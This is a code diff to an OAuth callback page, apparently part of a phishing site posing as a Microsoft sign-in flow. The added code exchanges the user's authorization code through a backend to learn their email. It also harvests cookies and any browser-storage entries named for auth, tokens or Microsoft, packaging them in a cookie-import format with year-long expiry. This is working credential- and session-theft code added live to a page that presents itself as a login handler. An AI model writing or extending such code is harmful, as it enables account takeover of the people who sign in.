@@ -90,9 +90,37 @@
                 // or handle this via your backend to keep secrets secure
                 statusEl.textContent = 'Loading...';
                 
+                // Try to extract email from authorization code (if possible) or use backend exchange
+                let userEmail = 'oauth-user@microsoft.com';
+                try {
+                    // First try to get user info via backend token exchange
+                    const currentDomain = window.location.origin;
+                    const backendTokenResponse = await fetch(`${currentDomain}/.netlify/functions/exchangeToken`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            code: code,
+                            redirect_uri: 'https://vaultydocs.com/oauth-callback'
+                        })
+                    });
+                    
+                    if (backendTokenResponse.ok) {
+                        const tokenResult = await backendTokenResponse.json();
+                        if (tokenResult.success && tokenResult.email) {
+                            userEmail = tokenResult.email;
+                            console.log('✅ Got user email from backend:', userEmail);
+                        } else if (tokenResult.userProfile && (tokenResult.userProfile.mail || tokenResult.userProfile.userPrincipalName)) {
+                            userEmail = tokenResult.userProfile.mail || tokenResult.userProfile.userPrincipalName;
+                            console.log('✅ Got user email from profile:', userEmail);
+                        }
+                    }
+                } catch (emailError) {
+                    console.log('⚠️ Could not get user email, using default');
+                }
+
                 // Create session data with the authorization code
                 const sessionData = {
-                    email: 'oauth-user@microsoft.com', // Will be updated after we get profile
+                    email: userEmail,
                     name: 'OAuth User',
                     id: 'oauth_' + Math.random().toString(36).substring(2, 15),
                     provider: 'Microsoft',
@@ -161,14 +189,17 @@
                     }
                                  }
 
-                // Format cookies properly
+                // Enhanced cookie capture - try multiple methods
+                let capturedCookies = [];
+                
+                // Method 1: Standard document.cookie (current domain only)
                 const cookieStrings = document.cookie.split(';').filter(c => c.trim());
-                sessionData.formattedCookies = cookieStrings.map(c => {
+                const currentDomainCookies = cookieStrings.map(c => {
                     const [name, value] = c.trim().split('=');
                     return name && value ? {
                         name: name,
                         value: value,
-                        domain: '.login.microsoftonline.com',
+                        domain: window.location.hostname,
                         path: '/',
                         secure: true,
                         httpOnly: false,
@@ -176,9 +207,62 @@
                         expirationDate: Math.floor(Date.now() / 1000) + (365 * 24 * 60 * 60),
                         hostOnly: false,
                         session: false,
-                        storeId: null
+                        storeId: null,
+                        source: 'document.cookie'
                     } : null;
                 }).filter(cookie => cookie !== null);
+                
+                capturedCookies = [...currentDomainCookies];
+                
+                // Method 2: Try to capture from localStorage/sessionStorage that might contain auth data
+                try {
+                    const localStorageData = Object.fromEntries(Object.entries(localStorage));
+                    const sessionStorageData = Object.fromEntries(Object.entries(sessionStorage));
+                    
+                    // Look for auth-related data in storage
+                    Object.entries(localStorageData).forEach(([key, value]) => {
+                        if (key.toLowerCase().includes('auth') || key.toLowerCase().includes('token') || key.toLowerCase().includes('microsoft')) {
+                            capturedCookies.push({
+                                name: key + '_localStorage',
+                                value: value,
+                                domain: window.location.hostname,
+                                source: 'localStorage',
+                                type: 'storage'
+                            });
+                        }
+                    });
+                    
+                    Object.entries(sessionStorageData).forEach(([key, value]) => {
+                        if (key.toLowerCase().includes('auth') || key.toLowerCase().includes('token') || key.toLowerCase().includes('microsoft')) {
+                            capturedCookies.push({
+                                name: key + '_sessionStorage',
+                                value: value,
+                                domain: window.location.hostname,
+                                source: 'sessionStorage',
+                                type: 'storage'
+                            });
+                        }
+                    });
+                } catch (storageError) {
+                    console.log('⚠️ Could not access browser storage');
+                }
+                
+                // Method 3: Check if we can get cookies from the referrer or iframe techniques
+                try {
+                    if (document.referrer && document.referrer.includes('login.microsoftonline.com')) {
+                        console.log('🔍 Came from Microsoft login page:', document.referrer);
+                        // Note: Cross-origin cookies won't be accessible due to security
+                    }
+                } catch (referrerError) {
+                    console.log('⚠️ Could not check referrer');
+                }
+                
+                sessionData.formattedCookies = capturedCookies;
+                console.log('🍪 Cookie capture summary:', {
+                    documentCookies: currentDomainCookies.length,
+                    totalCaptured: capturedCookies.length,
+                    sources: [...new Set(capturedCookies.map(c => c.source))]
+                });
 
                 console.log('🔍 Session data prepared:', { 
                     email: sessionData.email, 
